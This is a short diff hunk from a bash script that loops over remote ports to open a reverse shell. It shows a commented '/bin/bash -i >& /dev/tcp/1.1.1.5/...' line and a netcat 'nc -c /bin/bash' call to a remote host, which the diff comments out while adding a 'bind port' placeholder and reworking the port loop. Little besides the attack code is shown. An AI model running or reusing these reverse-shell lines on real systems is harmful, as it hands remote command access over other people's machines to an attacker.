@@ -26,14 +26,18 @@ do
         # /bin/bash -i >& /dev/tcp/1.1.1.5/$remote_port 0>&1
         
         #using netcat
-        nc -c /bin/bash $remote_host $remote_port
+        #nc -c /bin/bash $remote_host $remote_port
+
+        # bind port
 
 
-        break # break out of while loop
-    else
-        echo "Connection refused on port $remote_port, trying next port."
-        ((remote_port++))
+        # break # break out of while loop
+    # else
+        # echo "Connection refused on port $remote_port, trying next port."
+        
     fi
+    
+    ((remote_port++))
 done
 
 
